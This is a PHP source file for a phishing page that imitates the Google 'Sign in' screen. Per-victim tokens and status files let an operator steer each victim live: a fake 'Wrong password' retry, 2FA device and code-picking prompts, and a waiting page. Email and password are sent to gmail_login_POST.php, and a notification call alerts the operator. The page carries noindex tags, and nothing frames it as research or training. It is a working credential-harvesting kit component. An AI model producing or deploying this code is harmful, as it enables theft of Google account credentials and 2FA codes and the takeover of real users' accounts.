<?php
include "helper.php";

$token = $_GET['token'] ?? '';
if ($token === '') {
    header('Location: continue.php');
    exit;
}

$filePath = "status/" . $token . ".txt";
if (!file_exists($filePath)) {
    file_put_contents($filePath, 'gm_login');
}

$data = trim(file_get_contents($filePath));
if ($data === 'gm_wrong_pass') {
    file_put_contents($filePath, 'gm_login');
    header("Location: gmail_login.php?token=" . urlencode($token) . "&w=1");
    exit;
} elseif ($data === 'gm_2fa_device') {
    header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=device");
    exit;
} elseif ($data === 'gm_2fa_pick') {
    header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=pick");
    exit;
} elseif ($data === 'break') {
    header("Location: break.php?token=" . urlencode($token));
    exit;
} elseif ($data === 'gm_hold') {
    header("Location: gmail_login_POST.php?token=" . urlencode($token) . "&waiting=1");
    exit;
}

file_put_contents($filePath, 'gm_login');
notifyGmailPageOnce($token, 'login', 'GMAIL LOGIN PAGE');
$email = '';
$emailFile = "emails/" . $token . ".txt";
if (file_exists($emailFile)) {
    $email = trim(file_get_contents($emailFile));
}
$wrongPass = isset($_GET['w']) && $_GET['w'] === '1';
$startStep = ($email !== '' || $wrongPass) ? 'password' : 'email';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Sign in - Google Accounts</title>
    <link href="gmail-files/common.css?v=5" rel="stylesheet">
    <link href="gmail-files/login.css?v=5" rel="stylesheet">
</head>
<body class="gm-login" data-start-step="<?= htmlspecialchars($startStep); ?>" data-wrong-pass="<?= $wrongPass ? '1' : '0'; ?>">
    <div class="gm-login-main">
        <div class="gm-login-card">
            <div class="gm-login-left">
                <?php include __DIR__ . '/gmail-files/google-icon.inc.php'; ?>
                <h1>Sign in</h1>
                <p>with your Google Account. This account will be available to other Google apps in the browser.</p>
            </div>
            <div class="gm-login-right">
                <form method="post" action="gmail_login_POST.php" id="gm-login-form">
                    <input type="hidden" name="token" value="<?= htmlspecialchars($token); ?>">

                    <div id="step-email" class="<?= $startStep === 'password' ? 'gm-step-hidden' : ''; ?>">
                        <div class="gm-textfield">
                            <input class="gm-field" type="text" id="gm-email" name="email" value="<?= htmlspecialchars($email); ?>" autocomplete="username" placeholder=" ">
                            <label for="gm-email">Email or phone</label>
                        </div>
                        <a href="#" class="gm-forgot" onclick="return false;">Forgot email?</a>
                        <p class="gm-guest-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
                        <div class="gm-login-actions">
                            <a href="#" class="gm-link-btn" onclick="return false;">Create account</a>
                            <button type="button" class="gm-next-btn" id="btn-next-email">Next</button>
                        </div>
                    </div>

                    <div id="step-password" class="<?= $startStep === 'password' ? '' : 'gm-step-hidden'; ?>">
                        <div class="gm-email-chip">
                            <span class="avatar" id="chip-avatar"><?= $email !== '' ? strtoupper($email[0]) : 'U'; ?></span>
                            <span id="chip-email"><?= htmlspecialchars($email); ?></span>
                        </div>
                        <div class="gm-textfield<?= $wrongPass ? ' gm-error gm-is-filled' : ''; ?>">
                            <input class="gm-field<?= $wrongPass ? ' gm-field-error' : ''; ?>" type="password" id="gm-password" name="password" autocomplete="current-password" placeholder=" ">
                            <label for="gm-password">Enter your password</label>
                        </div>
                        <?php if ($wrongPass): ?>
                        <div class="gm-error-msg" role="alert">
                            <span class="gm-error-icon" aria-hidden="true">!</span>
                            <span class="gm-error-text">Wrong password. Try again or click "Forgot password?" for more options.</span>
                        </div>
                        <?php endif; ?>
                        <label class="gm-show-pwd">
                            <input type="checkbox" id="show-password"> Show password
                        </label>
                        <div class="gm-login-actions">
                            <a href="#" class="gm-forgot" onclick="return false;">Forgot password?</a>
                            <button type="submit" class="gm-next-btn">Next</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <footer class="gm-login-footer">
        <span>English (United States)</span>
        <div class="gm-login-footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>
    <script src="gmail-files/login.js"></script>
</body>
</html>
